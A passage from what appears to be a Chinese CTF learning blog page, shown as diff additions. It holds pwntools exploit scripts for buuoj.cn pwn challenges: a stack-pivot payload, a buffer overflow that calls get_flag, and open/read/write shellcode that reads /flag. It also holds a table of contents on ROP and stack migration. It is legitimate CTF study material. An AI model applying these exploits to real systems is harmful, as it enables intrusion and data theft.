class="number">0x28</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">payload+=p32(ebp-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="wp3"><a href="#wp3" class="headerlink" title="wp3"></a>wp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27444</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">write_addr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">flag_bss = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2D</span>) + p32(get_flag)+ p32(write_addr)+ <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> +p32(<span class="number">1</span>) + p32(flag_bss) + p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="wp4"><a href="#wp4" class="headerlink" title="wp4"></a>wp4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29475</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/03/the-most-mature-practice/" rel="prev" title="the most mature practice">
+      <i class="fa fa-chevron-left"></i> the most mature practice
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E7%A9%BA%E9%97%B4%E4%B8%8D%E5%A4%9F%E7%94%A8%E6%97%A0%E6%B3%95%E6%9C%89%E6%95%88%E6%9E%84%E9%80%A0rop%E9%93%BE%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-number">1.</span> <span class="nav-text">溢出空间不够用无法有效构造rop链怎么办?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E9%97%AE%E5%A6%82%E4%BD%95%E5%8A%AB%E6%8C%81ebp%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">请问如何劫持ebp？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%9E%84%E9%80%A0rop%E9%93%BE"><span class="nav-number">3.</span> <span class="nav-text">为什么要构造rop链?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E9%97%AE%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8leave%E5%92%8Cret%E4%B8%A4%E4%B8%AA%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E6%9D%A5%E5%81%9A%E5%88%B0%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%9F"><span class="nav-number">4.</span> <span class="nav-text">请问如何利用leave和ret两个汇编指令来做到栈迁移？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">5.</span> <span class="nav-text">怎么实现栈迁移?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%82%A3%E4%B9%88%E8%AF%B7%E9%97%AEgadget%E6%98%AF%E5%95%A5"><span class="nav-number">6.</span> <span class="nav-text">那么请问gadget是啥?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup"><span class="nav-number">7.</span> <span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2ebp-printf%E5%87%BD%E6%95%B0%E5%9C%A8%E8%BE%93%E5%87%BA%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0%E2%80%99-0%E2%80%98%E4%BC%9A%E5%81%9C%E6%AD%A2%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%88%91%E4%BB%AC%E5%B0%86%E5%8F%82%E6%95%B0s%E5%85%A8%E9%83%A8%E5%A1%AB%E6%BB%A1%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E6%B2%A1%E6%B3%95%E5%9C%A8%E6%9C%AB%E5%B0%BE%E8%A1%A5%E4%B8%8A%E2%80%99-0%E2%80%98%EF%BC%8C%E9%82%A3%E6%A0%B7%E5%B0%B1%E4%BC%9A%E5%B0%86ebp%E8%BF%9E%E5%B8%A6%E7%9D%80%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B7%E4%B8%BA%E6%88%91%E4%BB%8B%E7%BB%8D%E8%BF%99%E5%8F%A5%E8%AF%9D%E7%9A%84%E6%84%8F%E6%80%9D"><span class="nav-number">8.</span> <span class="nav-text">泄露ebp printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出，请为我介绍这句话的意思.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9"><span class="nav-number">9.</span> <span class="nav-text">为什么要设置断点?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8leave-ret%E5%8A%AB%E6%8C%81%E6%A0%88"><span class="nav-number">10.</span> <span class="nav-text">为什么要用leave ret劫持栈?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BytesWarning-Text-is-not-bytes-assuming-ASCII-no-guarantees-%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D"><span class="nav-number">11.</span> <span class="nav-text">BytesWarning: Text is not bytes; assuming ASCII, no guarantees.什么意思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bpayload%E6%80%8E%E4%B9%88%E5%86%99%E7%9A%84"><span class="nav-number">12.</span> <span class="nav-text">介绍一下payload怎么写的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%BC%80%E5%90%AF%E4%BA%86canary%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">13.</span> <span class="nav-text">32位程序，开启了canary是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#prctl%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">14.</span> <span class="nav-text">prctl是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E9%A2%98%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E5%8F%AA%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8sys-open%EF%BC%8Csys-read%EF%BC%8Csys-write-%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E7%9A%84%E8%B0%83%E7%94%A8%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8int-0x80-%E5%8E%BB%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%99%E7%A7%8D%E8%BF%87%E7%A8%8B%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D"><span class="nav-number">15.</span> <span class="nav-text">本题系统内核只允许使用sys_open，sys_read，sys_write 系统内核的调用就是利用int 0x80 去调用函数的这种过程什么意思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8int-0x80%E6%9D%A5%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%9F"><span class="nav-number">16.</span> <span class="nav-text">为什么要用int 0x80来调用系统调用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%92%8Csyscall%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="nav-number">17.</span> <span class="nav-text">和syscall有什么区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E4%B9%8B%E5%89%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E5%BF%85%E9%A1%BB%E5%85%88%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E3%80%82%E4%BB%8E%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E7%9C%8B%EF%BC%8C%E8%BF%99%E6%98%AF%E9%80%9A%E8%BF%87%E6%A0%87%E5%87%86-%E5%BA%93%E7%9A%84open%E5%87%BD%E6%95%B0%E5%AE%8C%E6%88%90%E7%9A%84%EF%BC%8C%E8%AF%A5%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%82%E5%86%85%E6%A0%B8%E4%B8%AD%E6%98%AF%E7%94%B1%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8sys-open-%E5%87%BD%E6%95%B0%E5%AE%8C%E6%88%90%E3%80%82-%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%E5%95%8A"><span class="nav-number">18.</span> <span class="nav-text">在文件读写之前，我们必须先打开文件。从应用程序的角度来看，这是通过标准 库的open函数完成的，该函数返回一个文件描述符。内核中是由系统调用sys_open()函数完成。 什么意思啊</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E4%B8%AAPython%E8%84%9A%E6%9C%AC%E6%98%AF%E7%94%A8%E6%9D%A5%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BAorw%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9A%84%E3%80%82%E5%AE%83%E4%BD%BF%E7%94%A8%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AB%E5%81%9Apwntools%E7%9A%84%E5%BA%93%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%BA%93%E6%98%AF%E4%B8%80%E4%B8%AACTF%E6%A1%86%E6%9E%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%8F%91%E5%BA%93%EF%BC%8C%E5%AE%83%E5%8F%AF%E4%BB%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E5%BF%AB%E9%80%9F%E5%9C%B0%E7%BC%96%E5%86%99%E5%92%8C%E8%BF%90%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E7%9A%84%E6%AF%8F%E4%B8%80%E8%A1%8C%E7%9A%84%E6%84%8F%E6%80%9D%E6%98%AF%EF%BC%9A"><span class="nav-number">19.</span> <span class="nav-text">这个Python脚本是用来利用一个名为orw的二进制文件的漏洞的。它使用了一个叫做pwntools的库，这个库是一个CTF框架和漏洞开发库，它可以帮助我们快速地编写和运行漏洞利用代码。这个脚本的每一行的意思是：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wp1"><span class="nav-number">20.</span> <span class="nav-text">wp1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wp2"><span class="nav-number">21.</span> <span class="nav-text">wp2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wp3"><span class="nav-number">22.</span> <span class="nav-text">wp3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wp4"><span class="nav-number">23.</span> <span class="nav-text">wp4</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
